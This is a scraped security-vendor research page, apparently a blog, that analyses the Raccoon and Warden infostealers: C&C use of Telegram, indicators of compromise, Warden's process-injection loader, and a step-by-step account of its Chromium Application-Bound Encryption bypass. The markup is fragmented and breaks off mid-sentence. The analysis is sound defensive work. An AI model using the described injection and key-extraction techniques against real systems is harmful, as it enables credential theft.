62em){.__m__-_R_2muqssm_{--col-flex-grow:auto;--col-flex-basis:calc(58.333333333333336% - 0.4166666666666667 * var(--grid-column-gap));--col-max-width:calc(58.333333333333336% - 0.4166666666666667 * var(--grid-column-gap));}}</style><div class="m_96bdd299 mantine-Grid-col __m__-_R_2muqssm_"><article class="blog-article-body"><address class="article-author visually-hidden">By <span><a rel="author" href="/blog/authors/threat-research-team">Threat Research Team</a></span></address><div style="--container-size:var(--container-size-xxl);max-width:calc(97.5rem * var(--mantine-scale));padding-inline:0rem" class="m_7485cace mantine-Container-root" data-size="xxl" data-strategy="block" id="post" data-component="post-content"><div class="RichText_wrapper__xZRh7"><p>We recently came across a stealer, called <code>Raccoon Stealer,</code> a name given to it by its author. Raccoon Stealer uses the <code>Telegram</code> infrastructure to store and update actual <code>C&amp;C</code> addresses.&nbsp;</p><p>Raccoon Stealer is a password stealer capable of stealing not just passwords, but various types of data, including:</p><ul><li>Cookies, saved logins and forms data from browsers</li><li>Login credentials from email clients and messengers</li><li>Files from crypto wallets</li><li>Data from browser plugins and extension</li><li>Arbitrary files based on commands from C&amp;C</li></ul><p>In addition, it’s able to download and execute arbitrary files by command from its C&amp;C. In combination with active development and promotion on underground forums, Raccoon Stealer is prevalent and dangerous.</p><p>The oldest samples of Raccoon Stealer we’ve seen have timestamps from the <code>end of April 2019</code>. Its authors have stated the same month as the start of selling the malware on underground forums. Since then, it has been updated many times. According to its authors, they fixed bugs, added features, and more.</p><h2><strong>Distribution</strong></h2><p>We’ve seen Raccoon distributed via downloaders: <code>Buer Loader</code> and <code>GCleaner</code>. According to some samples, we believe it is also being distributed in the form of <code>fake game cheats</code>, <code>patches for cracked software</code> (including hacks and mods for <code>Fortnite</code>, <code>Valorant</code>, and <code>NBA2K22</code>), or other software. Taking into account that Raccoon Stealer is for sale, it’s distribution techniques are limited only by the imagination of the end buyers. Some samples are spread unpacked, while some are protected using <code>Themida</code> or malware packers. Worth noting is that some samples were packed more than <a href="https://twitter.com/AvastThreatLabs/status/1420372556142432257">five times in a row</a> with the same packer!&nbsp;</p><p><strong>Technical details</strong></p><p>Raccoon Stealer is written in <code>C/C++</code> and built using <code>Visual Studio</code>. Samples have a size of about <code>580-600 kB</code>. The code quality is below average, some strings are encrypted, some are not.</p><p>Once executed, Racoon Stealer starts checking for the default user locale set on the infected device and won’t work if it’s one of the following:</p><ul><li>Russian</li><li>Ukrainian</li><li>Belarusian</li><li>Kazakh</li><li>Kyrgyz</li><li>Armenian</li><li>Tajik</li><li>Uzbek</li></ul><h2><strong>C&amp;C communications</strong></h2><p>The most interesting thing about this stealer is its communication with C&amp;Cs. There are four values crucial for its C&amp;C communication, which are hardcoded in every Raccoon Stealer sample:</p><ul><li><code>MAIN_KEY</code>. This value has been changed four times during the year.</li><li><code>URLs</code> of Telegram gates with channel name. Gates are used not to implement a complicated Telegram protocol and not to store any credentials inside samples</li><li><code>BotID</code> – hexadecimal string, sent to the C&amp;C every time</li><li><code>TELEGRAM_KEY</code> – a key to decrypt the C&amp;C address obtained from Telegram Gate</li></ul><p>Let’s look at an example to see how it works:<br><code>447c03cc63a420c07875132d35ef027adec98e7bd446cf4f7c9d45b6af40ea2b</code> unpacked to:<br><code>f1cfcce14739887cc7c082d44316e955841e4559ba62415e1d2c9ed57d0c6232</code>:</p><ol><li>First of all, <code>MAIN_KEY</code> is decrypted. See the decryption code in the image below:</li></ol></div><div style="padding-inline:0rem;margin-block:var(--mantine-spacing-md)" class="imageWithCaption_container__fP6ro class="RichText_wrapper__xZRh7"><p>Here you can see a Telegram channel name and its status in Base64: <code>e74b2mD/ry6GYdwNuXl10SYoVBR7/tFgp2f-v32</code><br>The prefix (always five characters) and postfix (always six characters) are removed and it becomes <code>mD/ry6GYdwNuXl10SYoVBR7/tFgp</code> The Base64 is then decoded to obtain an encrypted C&amp;C URL:</p></div><div style="padding-inline:0rem;margin-block:var(--mantine-spacing-md)" class="imageWithCaption_container__fP6ro imageWithCaption_fullWidth__4Ncwy m_7485cace mantine-Container-root" 2x" src="/blog/_next/image?url=https%3A%2F%2Fwww.gendigital.com%2Fblog%2Fsites%2Fdefault%2Ffiles%2Fstyles%2Fblogs_paragraph_image_small%2Fpublic%2F2024-06%2Frs04.png.webp%3Fitok%3D9d_O_IJS&amp;w=640&amp;q=75"/></picture></div><div class="RichText_wrapper__xZRh7"><p>The <code>TELEGRAM_KEY</code> in this sample is a string <code>739b4887457d3ffa7b811ce0d03315ce</code> and the Raccoon uses it as a key to <code>RC4</code> algorithm to finally decrypt the C&amp;C URL: <code>http://91.219.236[.]18/</code></p><ol start="4"><li>Raccoon makes a query string with PC information (machine GUID and user name), and <code>BotID</code></li><li>Query string is encrypted with <code>RC4</code> using a <code>MAIN_KEY</code> and then encoded with Base64.</li><li>This data is sent using POST to the C&amp;C, and the response is encoded with Base64 and encrypted with the <code>MAIN_KEY</code>. Actually, it’s a JSON with a lot of parameters and it looks like this:</li></ol></div><div style="padding-inline:0rem;margin-block:var(--mantine-spacing-md)" class="imageWithCaption_container__fP6ro imageWithCaption_fullWidth__4Ncwy m_7485cace mantine-Container-root" data-strategy="block"><picture id="the-picture"><source 2x" class="RichText_wrapper__xZRh7"><p>Thus, the Telegram infrastructure is used to store and update actual C&amp;C addresses. It looks quite convenient and reliable until Telegram decides to take action.&nbsp;</p><p><strong>Analysis</strong></p><h2><strong>The people behind Raccoon Stealer</strong></h2><p>Based on our analysis of seller messages on underground forums, we can deduce some information about the people behind the malware. Raccoon Stealer was developed by a team, some (or maybe all) members of the team are Russian native speakers. Messages on the forum are written in Russian, and we assume they are from former USSR countries because they try to prevent the Stealer from targeting users in these countries.</p><p>Possible names/nicknames of group members may be supposed based on the analysis of artifacts, found in samples:</p><ul><li><code>C:\Users\a13xuiop1337\</code></li><li><code>C:\Users\David\&nbsp;</code></li></ul><h2><strong>Prevalence</strong></h2><p>Raccoon Stealer is quite prevalent: from <code>March 3, 2021 - February 17, 2022</code> our systems detected <code>more than 25,000</code> Raccoon-related samples. We identified <code>more than 1,300</code> distinct configs during that period.<br>&nbsp;</p><p>Here is a map, showing the number of systems Avast protected from Raccoon Stealer from <code>March 3, 2021 - February 17, 2022</code>. In this time frame, Avast protected nearly <code>600,000</code> Raccoon Stealer attacks.</p></div><div style="padding-inline:0rem;margin-block:var(--mantine-spacing-md)" class="imageWithCaption_container__fP6ro imageWithCaption_fullWidth__4Ncwy m_7485cace mantine-Container-root" data-strategy="block"><picture id="the-picture"><source 1x, 2x" src="/blog/_next/image?url=https%3A%2F%2Fwww.gendigital.com%2Fblog%2Fsites%2Fdefault%2Ffiles%2Fstyles%2Fblogs_paragraph_image_small%2Fpublic%2F2024-06%2Frs06.png.webp%3Fitok%3DL7c9xtm9&amp;w=640&amp;q=75"/></picture></div><div class="RichText_wrapper__xZRh7"><p>The country where we have blocked the most attempts is Russia, which is interesting because the actors behind the malware don’t want to infect computers in Russia or Central Asia. We believe the attacks spray and pray, distributing the malware around the world. It’s not until it makes it onto a system that it begins checking for the default locale. If it is one of the language listed above, it won’t run. This explains why we detected so many attack attempts in Russia, we block the malware before it can run, ie. before it can even get to the stage where it checks for the device’s locale. If an unprotected device that comes across the malware with its locale set to English or any other language that is not on the exception list but is in Russia, it would stiIl become infected.&nbsp;</p></div><div style="padding-inline:0rem;margin-block:var(--mantine-spacing-md)" class="imageWithCaption_container__fP6ro imageWithCaption_fullWidth__4Ncwy m_7485cace mantine-Container-root" data-strategy="block"><picture id="the-picture"><source srcSet="https://www.gendigital.com/blog/sites/default/files/styles/blogs_paragraph_image_large/public/2024-06/rs07.png.webp?itok=j8AiQ7xC 1x, class="mantine-focus-auto bodyText imageWithCaption_caption__hCQ67 picture-caption m_b6d8b162 mantine-Text-root">Screenshot with claims about not working with CIS</p></div><div class="RichText_wrapper__xZRh7"><h2><strong>Telegram Channels</strong></h2><p>From the more than 1,300 distinct configs we extracted, 429 of them are unique Telegram channels. Some of them were used only in a single config, others were used dozens of times. The most used channels were:</p><ul><li><code>jdiamond13</code> – 122 times</li><li><code>jjbadb0y</code> – 44 times</li><li><code>nixsmasterbaks2</code> – 31 times</li><li><code>hellobyegain</code> – 25 times</li><li><code>h_smurf1kman_1&nbsp;</code> – 24 times</li></ul><p>Thus, five of the most used channels were found in about <code>19%</code> of configs.</p><h2><strong>Malware distributed by Raccoon</strong></h2><p>As was previously mentioned, Raccoon Stealer is able to download and execute arbitrary files from a command from C&amp;C. We managed to collect some of these files. We collected <code>185 files</code>, with a total size <code>265 Mb</code>, and some of the groups are:</p><ul><li><code>Downloaders</code> – used to download and execute other files</li><li><code>Clipboard crypto stealers</code> – change crypto wallet addresses in the clipboard – very popular (more than 10%)</li><li><code>WhiteBlackCrypt Ransomware</code></li></ul><h3><strong>Servers used to download this software</strong></h3><p>We extracted unique links to other malware from Raccoon configs received from C&amp;Cs, it was <code>196 unique URLs</code>. Some analysis results:</p><ul><li><code>43% </code>of URLs have <code>HTTP</code> scheme, <code>57%</code> – <code>HTTPS</code>.</li><li><code>83 domain names</code> were used.</li><li>About <code>20% of malware</code> were placed on <code>Discord CDN</code></li><li>About <code>10%</code> were served from <code>aun3xk17k[.]space</code></li></ul><p><strong>Conclusion</strong></p><p>We will continue to monitor Raccoon Stealer’s activity, keeping an eye on new C&amp;Cs, Telegram channels, and downloaded samples. We predict it may be used wider by other cybercrime groups. We assume the group behind Raccoon Stealer will further develop new features, including new software to steal data from, for example, as well as bypass protection this software has in place.</p><h2><strong>IoC</strong></h2><p><code>447c03cc63a420c07875132d35ef027adec98e7bd446cf4f7c9d45b6af40ea2b</code><br><code>f1cfcce14739887cc7c082d44316e955841e4559ba62415e1d2c9ed57d0c6232</code></p></div><p Points\u003c/h2\u003e\n\u003cul\u003e\n\u003cli\u003e\n\u003cp\u003eGen Threat Labs has been tracking Warden Stealer, an emerging and actively developed malware-as-a-service (MaaS) infostealer written in the Rust programming language that has, within just a few months, already become one of the most prevalent infostealers in our user base.\u003c/p\u003e\n\u003c/li\u003e\n\u003cli\u003e\n\u003cp\u003eUnlike most of its competitors, Warden Stealer is not sold as a pure stealer but comes with its own loader and a built-in cryptocurrency clipper.\u003c/p\u003e\n\u003c/li\u003e\n\u003cli\u003e\n\u003cp\u003eWarden Stealer is one of the first infostealers targeting configuration files and local data belonging to AI assistants and agentic coding tools.\u003c/p\u003e\n\u003c/li\u003e\n\u003cli\u003e\n\u003cp\u003eIts builds are heavily obfuscated, morphed, and regularly updated to evade detection.\u003c/p\u003e\n\u003c/li\u003e\n\u003cli\u003e\n\u003cp\u003eIn this technical blog post, we focus on the attribution of the stealer and provide a technical breakdown of its capabilities, including an analysis of its Application-Bound Encryption (ABE) bypass.\u003c/p\u003e\n\u003c/li\u003e\n\u003c/ul\u003e\n\u003ch2\u003eIntroduction \u0026amp; Attribution\u003c/h2\u003e\n\u003cp\u003eWarden Stealer is a rapidly growing and actively developed infostealer-as-a-service, promoted on underground forums since August 2026. The stealer is written in the Rust programming language and targets Windows systems from Windows 8 through Windows 11 (Figure 1 below also lists Windows 7 as supported, but support for it was dropped as of Warden Stealer version 1.9).\u003c/p\u003e\n\u003cp\u003eAccording to its advertisement, Warden Stealer is supposedly capable of stealing data from all Chromium- and Gecko-based browsers, more than 200 cryptocurrency wallet extensions, and over 360 other targets across 13 categories, including messengers, password managers, 2FA tools, and VPN clients, with the ability to further expand its collection scope through custom file and registry grabbing rules. That said, the actual scope of collected data always depends on the configuration of the specific build, which, based on our analysis, can vary significantly from one operator to another.\u003c/p\u003e"},{"bundle":"image","images":[{"sources":[{"srcset":"https://www.gendigital.com/blog/sites/default/files/styles/blogs_paragraph_image_large/public/2026-10/warden_stealer_figure_01.jpg.webp?itok=FWwYqEvH is particularly worth highlighting, however, is that Warden Stealer is one of the first infostealers we have observed stealing configuration files and local data belonging to AI assistants and agentic coding tools, such as Claude, Codex, Grok, and Cursor. This reflects an emerging trend we have been observing across the infostealer landscape recently, and one that comes as no surprise, given how much sensitive information these files may hold. Depending on the agent and its configuration, they may contain access and refresh tokens, credentials stored in MCP configurations, prompt histories, conversation databases, and traces of the projects a developer has been working on, giving an attacker both the means to access an account and the context needed to understand what valuable data is behind it.\u003c/p\u003e\n\u003cp\u003eInterestingly, stealing AI agent data was not among the capabilities originally listed in Warden Stealer’s advertisement, nor was it part of every build’s dynamic configuration, which led us to believe that it was the result of custom collection rules defined by specific operators. This, however, changed with Warden Stealer version 1.9 (announced on September 29, 2026), in which the malware authors officially announced the collection of tokens from AI coding agents (see Figure 2). Either way, whether through custom rules or built-in support, AI agent data is now targeted in a substantial subset of Warden Stealer builds, highlighting the growing trend of such data quickly becoming a target of interest for infostealers.\u003c/p\u003e"},{"bundle":"image","images":[{"sources":[{"srcset":"https://www.gendigital.com/blog/sites/default/files/styles/blogs_paragraph_image_large/public/2026-10/warden_stealer_figure_02.jpg.webp?itok=4yRGb4yb What pointed us in the right direction, however, was our in-depth analysis of the stealer, which we cross-referenced with the technical details of the malware shared on underground forums by the authors themselves, as well as with information from a recent \u003ca href=\"https://g0njxa.medium.com/approaching-stealers-devs-a-brief-interview-with-warden-a978d5ae1147\"\u003einterview with Warden Stealer’s authors\u003c/a\u003e conducted by \u003ca href=\"https://x.com/g0njxa\"\u003eg0njxa\u003c/a\u003e. This is consistent with the interview, in which the malware authors attribute the choice of Rust to their prior experience with it, as well as to the “very good opportunities for code morphing” it provides. Morphing, in turn, is exactly where, we have to admit, Warden Stealer undoubtedly stands out from what is usual in the MaaS ecosystem. Unsurprisingly, it is also one of the main selling points the authors build their marketing around, advertising Warden Stealer as the “only true morpher on the market (not just an obfuscator), built upon AST code parsing and LLVM IR passes.”\u003c/p\u003e\n\u003cp\u003eBased on our analysis, the individual builds are indeed heavily obfuscated and morphed. Combined with the fact that Rust binaries are notoriously hard to reverse engineer, this makes Warden Stealer genuinely tricky to detect statically, but of course not impossible, as Warden authors the malware authors state in the interview that development of the stealer began in early 2026 and that the project was made available to the public on July 21, 2026. having been on the market for only a short period of time, Warden Stealer has already positioned itself as a major player in the infostealer landscape and is currently one of the most prevalent infostealers in our user base (together with \u003ca href=\"https://www.gendigital.com/blog/insights/research/inside-vidar-abe-bypass\"\u003eVidar\u003c/a\u003e, \u003ca href=\"https://www.gendigital.com/blog/insights/research/wordlistloader-delivering-amatera-via-clearfake-campaigns\"\u003eAmatera\u003c/a\u003e, and \u003ca href=\"https://www.gendigital.com/blog/insights/research/remus-64bit-variant-of-lumma-stealer\"\u003eRemus\u003c/a\u003e).\u003c/p\u003e\n\u003cp\u003eRegarding its distribution, since Warden Stealer is sold as MaaS, the infection vectors ultimately depend on the individual operators. As a result, we are seeing it delivered through all the standard infection vectors, including, among others, supposedly cracked software, game cheats, malvertising, and ClickFix campaigns.\u003c/p\u003e\n\u003cp\u003eGiven its active development, the built-in loader and clipper, the authors’ ongoing efforts to modify their builds to evade detection, and their use of AI (as they claimed in the interview), we expect Warden Stealer to remain a key player in the infostealer market for the foreseeable future.\u003c/p\u003e\n\u003ch2\u003eTechnical Analysis\u003c/h2\u003e\n\u003cp\u003eIn this section, we focus on selected technical aspects of Warden Stealer. Note that this is only a selected subset of its functionality rather than an exhaustive overview.\u003c/p\u003e\n\u003ch3\u003eWarden Loader\u003c/h3\u003e\n\u003cp\u003eWhen it comes to the Malware-as-a-Service (MaaS) infostealer ecosystem, the operational boundaries are usually strictly drawn: the malware authors develop the core payload (the stealer), while operators are left to handle the rest of the infection chain, including defense-evasion layers (crypters and/or loaders) and payload delivery. Against this conventional backdrop, Warden Stealer stands out as a notable exception, as it comes with its own dedicated loader, which takes some of the burden off operators and may thus partly account for the stealer’s rapid rise in popularity.\u003c/p\u003e\n\u003cp\u003eJudging from our code analysis, we assess with high confidence that the loader is not a third-party add-on but a component developed and maintained in-house by the Warden Stealer authors themselves. We base this assessment on the fact that the loader shares the same obfuscation scheme and a non-trivial number of other similarities with the stealer (some of which we highlight throughout the rest of this blog post), firmly linking both components to the same malware authors. That said, the loader layer is not strictly required, as the stealer can also be shipped as a standalone binary. Still, we predominantly observe Warden Stealer being distributed inside this loader.\u003c/p\u003e\n\u003cp\u003eFunctionally, the loader is rather straightforward, operating with one clear goal – to reconstruct the stealer payload in memory and execute it. Overall, Warden Stealer can be deployed in one of three available execution modes:\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003e\n\u003cp\u003e\u003cstrong\u003eInjection mode:\u003c/strong\u003e the loader is shipped as an EXE that reconstructs the stealer payload (DLL) and injects it into an already-running, legitimate-looking process. This is the most common mode and likely the default configuration.\u003c/p\u003e\n\u003c/li\u003e\n\u003cli\u003e\n\u003cp\u003e\u003cstrong\u003eSideload mode:\u003c/strong\u003e the loader is shipped as a DLL alongside a legitimately signed EXE that sideloads it. Once sideloaded, the loader reconstructs the stealer payload (DLL) and executes it in memory within the host process.\u003c/p\u003e\n\u003c/li\u003e\n\u003cli\u003e\n\u003cp\u003e\u003cstrong\u003eStandalone mode:\u003c/strong\u003e the stealer is shipped without the loader layer altogether, as a standalone EXE.\u003c/p\u003e\n\u003c/li\u003e\n\u003c/ul\u003e\n\u003cp\u003eSince the vast majority of samples we observe in the wild use the injection mode, we focus solely on this specific mode going forward.\u003c/p\u003e\n\u003cp\u003eThe stealer payload is embedded in the loader’s \u003ccode\u003e.rdata\u003c/code\u003e section and encoded using a custom Base64-like alphabet unique to each build. Interestingly, these alphabets differ across builds not only in character order but also in the character set itself (i.e., they are not mere permutations of a single character set). Nevertheless, each alphabet consists solely of printable ASCII characters and is shared by the loader and the stealer build it carries, both of which use it to decode their obfuscated blobs, including obfuscated strings.\u003c/p\u003e\n\u003cp\u003eExamples of Base64-like alphabets observed across different Warden Stealer deobfuscation process itself consists of two steps. Each encoded blob, whether an obfuscated string or the stealer payload, is first decoded using the custom Base64-like scheme. The loader maps each character to its index in the 64-character alphabet, subtracts a blob-specific shift modulo 64, and combines the resulting 6-bit values into bytes as in ordinary Base64. The decoded stream is then decompressed using a custom LZSS-style format.\u003c/p\u003e\n\u003cp\u003eRegarding the payload reconstruction, the loader processes three separately decoded blobs: the main blob containing the PE section data, an auxiliary blob providing the PE header template, and a bootstrap stub template. The first two blobs are combined to reconstruct the stealer’s PE image in memory, while the bootstrap stub template is filled with runtime values and appended after the rebuilt image and a runtime-built context block.\u003c/p\u003e\n\u003cp\u003eNext, the loader selects the target process for injection. The latest builds do so by locating the \u003ccode\u003eShell_TrayWnd\u003c/code\u003e window (the Windows taskbar) using \u003ccode\u003eFindWindowA\u003c/code\u003e and retrieving the PID of its owning process via \u003ccode\u003eGetWindowThreadProcessId\u003c/code\u003e. In a standard Windows session, this window typically belongs to \u003ccode\u003eexplorer.exe\u003c/code\u003e, although the loader does not verify the process name. Older builds also targeted other processes, such as \u003ccode\u003emsiexec.exe\u003c/code\u003e or \u003ccode\u003edllhost.exe\u003c/code\u003e.\u003c/p\u003e\n\u003cp\u003eAfter obtaining a handle to the target process, the loader allocates executable memory within it using \u003ccode\u003eVirtualAllocEx\u003c/code\u003e with the \u003ccode\u003ePAGE_EXECUTE_READWRITE\u003c/code\u003e protection flag. Once the remote base address is known, it applies the necessary relocations and injects the reconstructed image, context block, and bootstrap stub into the allocated region as a single contiguous buffer via \u003ccode\u003eWriteProcessMemory\u003c/code\u003e. Subsequently, the loader invokes \u003ccode\u003eCreateRemoteThread\u003c/code\u003e to start execution at the appended bootstrap stub.\u003c/p\u003e\n\u003cp\u003eSince the payload is manually mapped, the standard Windows loader does not register it as a loaded module. To fill this gap, the bootstrap stub first retrieves the PEB via \u003ccode\u003eRtlGetCurrentPeb\u003c/code\u003e and links two \u003ccode\u003eLIST_ENTRY\u003c/code\u003e nodes from the context block into \u003ccode\u003ePEB-\u0026gt;Ldr-\u0026gt;InLoadOrderModuleList\u003c/code\u003e and \u003ccode\u003ePEB-\u0026gt;Ldr-\u0026gt;InMemoryOrderModuleList\u003c/code\u003e, making the payload visible to code that enumerates these lists. Finally, the bootstrap stub invokes non-null function pointers from a fixed range in the payload image, including its TLS callbacks, and transfers control to the payload by calling its PE entry point.\u003c/p\u003e"},{"bundle":"image","images":[{"sources":[{"srcset":"https://www.gendigital.com/blog/sites/default/files/styles/blogs_paragraph_image_large/public/2026-10/warden_stealer_figure_11.jpg.webp?itok=pUFAhmWd is also worth noting that the Warden Stealer loader binaries are often deliberately inflated with a massive PE overlay, a design choice intended to bypass detection (also employed, for example, by from being uploaded to cloud-based sandboxes or threat intelligence platforms, which enforce their own strict upload limits to manage bandwidth and storage costs.\u003c/p\u003e\n\u003ch3\u003eObfuscation\u003c/h3\u003e\n\u003cp\u003eWhen it comes to static analysis, Warden Stealer builds are protected with several layers of obfuscation. However, since the obfuscation is subject to frequent changes, both to evade detection and to break automated analysis tooling, we do not aim to provide an exhaustive technical breakdown, but rather to give readers a general overview of the techniques used. Note that all techniques covered below apply to both the loader and the stealer.\u003c/p\u003e\n\u003cp\u003eFirst, as already mentioned in the loader section, Warden Stealer obfuscates its strings Encryption Bypass\u003c/h3\u003e\n\u003cp\u003eA key part of Warden Stealer’s functionality is the theft of sensitive browser data, such as cookies and passwords, from Chromium-based browsers. Nowadays, however, such data is protected by \u003ca href=\"https://security.googleblog.com/2024/07/improving-security-of-chrome-cookies-on.html\"\u003eApplication-Bound Encryption (ABE)\u003c/a\u003e. To bypass ABE, the stealer employs an approach that we have not previously observed in this exact form but that closely resembles a combination of the bypasses used by the latest versions of Vidar and Remus. Nevertheless, its implementation differs in several aspects, suggesting independent development rather than a direct copy.\u003c/p\u003e\n\u003cp\u003eSince we have already covered the bypasses of \u003ca href=\"https://www.gendigital.com/blog/insights/research/inside-vidar-abe-bypass\"\u003eVidar\u003c/a\u003e and \u003ca href=\"https://www.gendigital.com/blog/insights/research/remus-64bit-variant-of-lumma-stealer\"\u003eRemus\u003c/a\u003e, as well as \u003ca href=\"https://www.gendigital.com/blog/insights/research/voidstealer-abe-bypass\"\u003ethe inner workings of ABE\u003c/a\u003e, in our earlier posts, we do not revisit them here and instead outline the main ideas behind Warden Stealer’s own implementation. For readers interested in the broader background, we encourage checking those earlier posts.\u003c/p\u003e\n\u003cp\u003eFrom a high-level perspective, Warden Stealer’s approach to bypassing ABE boils down to three steps:\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003e\n\u003cp\u003eLocate a candidate \u003ccode\u003ev20_master_key\u003c/code\u003e in its \u003cstrong\u003eencrypted form\u003c/strong\u003e within the browser’s memory\u003c/p\u003e\n\u003c/li\u003e\n\u003cli\u003e\n\u003cp\u003eExecute injected shellcode inside the browser process to decrypt the key\u003c/p\u003e\n\u003c/li\u003e\n\u003cli\u003e\n\u003cp\u003eRead the decrypted key back\u003c/p\u003e\n\u003c/li\u003e\n\u003c/ul\u003e\n\u003cp\u003eBefore any decryption can take place, however, Warden Stealer first needs to locate the \u003ccode\u003ev20_master_key\u003c/code\u003e in its encrypted form. Here, its approach closely resembles that of Vidar, as it also scans the browser’s memory for a layout consistent with entries in Chromium’s \u003ccode\u003eos_crypt_async::Encryptor::KeyRing\u003c/code\u003e, a map that holds the keys used by the \u003ccode\u003eEncryptor\u003c/code\u003e class, including the encrypted \u003ccode\u003ev20_master_key\u003c/code\u003e. That said, its scanning pattern is considerably simpler. Whereas Vidar matches a 32-byte signature that also covers fixed values of specific fields within a \u003ccode\u003eKeyRing\u003c/code\u003e entry, Warden Stealer searches the browser’s memory solely for the four-byte sequence \u003ccode\u003ev20\\x00\u003c/code\u003e – the null-terminated \u003ccode\u003ev20\u003c/code\u003e tag under which the \u003ccode\u003ev20_master_key\u003c/code\u003e is stored in the \u003ccode\u003eKeyRing\u003c/code\u003e map.\u003c/p\u003e\n\u003cp\u003eNaturally, such a short pattern yields more candidates, so Warden Stealer narrows them down by checking whether the values at specific offsets from each match are consistent with the expected layout of a \u003ccode\u003eKeyRing\u003c/code\u003e entry. Now, this part is admittedly a bit tricky, as it relies on several assumptions we made about the internal memory layout, as well as on implementation-specific representations of various C++ standard library types (\u003ccode\u003estd::map\u003c/code\u003e, \u003ccode\u003estd::string\u003c/code\u003e, \u003ccode\u003estd::vector\u003c/code\u003e, and \u003ccode\u003estd::optional\u003c/code\u003e). Therefore, please treat the following interpretation as a high-confidence assessment rather than a certainty. That said, judging from our analysis, we strongly believe that these checks follow from the memory layout of a \u003ccode\u003eKeyRing\u003c/code\u003e entry.\u003c/p\u003e\n\u003cp\u003eChromium \u003ca href=\"https://github.com/chromium/chromium/blob/2e22ca200ff2c2c2606e345b0ec880339b6bfa73/components/os_crypt/async/common/encryptor.h#L121\"\u003edefines\u003c/a\u003e \u003ccode\u003eKeyRing\u003c/code\u003e as \u003ccode\u003estd::map\u0026lt;/*tag=*/std::string, std::optional\u0026lt;Key\u0026gt;\u0026gt;\u003c/code\u003e, so each of its entries is a \u003ccode\u003estd::pair\u0026lt;const std::string, std::optional\u0026lt;Key\u0026gt;\u0026gt;\u003c/code\u003e stored in a node of the red-black tree that implements the map. Within this pair, the \u003ccode\u003estd::string\u003c/code\u003e tag is followed by the \u003ccode\u003estd::optional\u0026lt;Key\u0026gt;\u003c/code\u003e value, whose \u003ccode\u003eKey\u003c/code\u003e object holds the encrypted \u003ccode\u003ev20_master_key\u003c/code\u003e in its \u003ccode\u003ekey_\u003c/code\u003e member variable (a \u003ccode\u003estd::vector\u0026lt;uint8_t\u0026gt;\u003c/code\u003e).\u003c/p\u003e\n\u003cp\u003eSpecifically, Warden Stealer inspects three consecutive \u003ccode\u003eqwords\u003c/code\u003e at offsets \u003ccode\u003e+32\u003c/code\u003e, \u003ccode\u003e+40\u003c/code\u003e, and \u003ccode\u003e+48\u003c/code\u003e from each \u003ccode\u003ev20\\x00\u003c/code\u003e match, which, under libc++’s default pointer-based representation of \u003ccode\u003estd::vector\u003c/code\u003e, should correspond to the \u003ccode\u003ebegin\u003c/code\u003e, \u003ccode\u003eend\u003c/code\u003e, and \u003ccode\u003ecapacity_end\u003c/code\u003e pointers of the \u003ccode\u003ekey_\u003c/code\u003e vector, as illustrated in Figure 21 (and previously dissected in greater detail in \u003ca href=\"https://www.gendigital.com/blog/insights/research/inside-vidar-abe-bypass\"\u003eour analysis of Vidar’s ABE bypass\u003c/a\u003e). This leads us to conclude that the stealer leverages the \u003ccode\u003ekey_\u003c/code\u003e vector as a verification mechanism: only if the data at these offsets plausibly resembles a \u003ccode\u003estd::vector\u003c/code\u003e structure does the stealer treat the match as a candidate \u003ccode\u003eKeyRing\u003c/code\u003e node. In practice, the verification is rather heuristic and boils down to the following sanity checks of the three pointers:\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003e\n\u003cp\u003eThe \u003ccode\u003ebegin\u003c/code\u003e pointer must be 8-byte aligned and lie within the user-mode address range (\u003ccode\u003e0x10000–0x7FFFFFFFFFFF\u003c/code\u003e)\u003c/p\u003e\n\u003c/li\u003e\n\u003cli\u003e\n\u003cp\u003eThe \u003ccode\u003eend\u003c/code\u003e pointer must equal \u003ccode\u003ebegin + 32\u003c/code\u003e, indicating a 32-byte buffer (i.e., the size of the \u003ccode\u003ev20_master_key\u003c/code\u003e)\u003c/p\u003e\n\u003c/li\u003e\n\u003cli\u003e\n\u003cp\u003eThe \u003ccode\u003ecapacity-end\u003c/code\u003e pointer must also be 8-byte aligned, lie within the user-mode address range, and fall between \u003ccode\u003eend\u003c/code\u003e and \u003ccode\u003ebegin + 64\u003c/code\u003e, limiting the vector’s capacity to between 32 and 64 bytes\u003c/p\u003e\n\u003c/li\u003e\n\u003c/ul\u003e"},{"bundle":"image","images":[{"sources":[{"srcset":"https://www.gendigital.com/blog/sites/default/files/styles/blogs_paragraph_image_large/public/2026-10/warden_stealer_figure_21.jpg.webp?itok=e_5HjukU libc++ also supports an \u003ca href=\"https://chromium.googlesource.com/external/github.com/llvm/llvm-project/libcxx/+/97b436da4c33663581d394f4ee0a5977fc38c2f4/include/__vector/layout.h#82\"\u003ealternative size-based \u003ccode\u003ecapacity\u003c/code\u003e fields instead of two additional pointers. Notably, Warden Stealer’s filtering logic appears to account for this variant as well: if the \u003ccode\u003ebegin\u003c/code\u003e pointer passes the alignment check but the second \u003ccode\u003eqword\u003c/code\u003e does not equal \u003ccode\u003ebegin + 32\u003c/code\u003e, the stealer falls back to checking whether the \u003ccode\u003eqword\u003c/code\u003e itself equals \u003ccode\u003e32\u003c/code\u003e. It then requires the third \u003ccode\u003eqword\u003c/code\u003e to have no bits set other than \u003ccode\u003e0x20\u003c/code\u003e, effectively accepting only \u003ccode\u003e0\u003c/code\u003e or \u003ccode\u003e32\u003c/code\u003e. A \u003ccode\u003ebegin\u003c/code\u003e pointer followed by two values of \u003ccode\u003e32\u003c/code\u003e thus describes the same \u003ccode\u003ekey_\u003c/code\u003e vector (a 32-byte buffer with a capacity of 32 bytes) but in its \u003cstrong\u003esize-based representation\u003c/strong\u003e. collected candidates (the \u003ccode\u003ebegin\u003c/code\u003e pointers of the identified \u003ccode\u003ekey_\u003c/code\u003e vectors, each presumably pointing to an encrypted \u003ccode\u003ev20_master_key\u003c/code\u003e) are then sorted, deduplicated, and tested one by one. For each candidate, Warden Stealer reads the 32 bytes it points to and stages them in the target browser process alongside a short shellcode stub. To run the stub, it hijacks one of the browser’s existing threads by suspending it, saving its original context, and redirecting its instruction pointer to the shellcode. Once resumed, the shellcode stub invokes \u003ccode\u003eCryptUnprotectMemory\u003c/code\u003e on the staged buffer with the \u003ccode\u003eCRYPTPROTECTMEMORY_SAME_PROCESS\u003c/code\u003e flag (similar to Remus, which likewise injects a small shellcode into the browser to perform exactly this call). Because the decryption happens in place, Warden Stealer simply polls the buffer and compares it against the original encrypted bytes. If the contents differ, it treats the result as a recovered 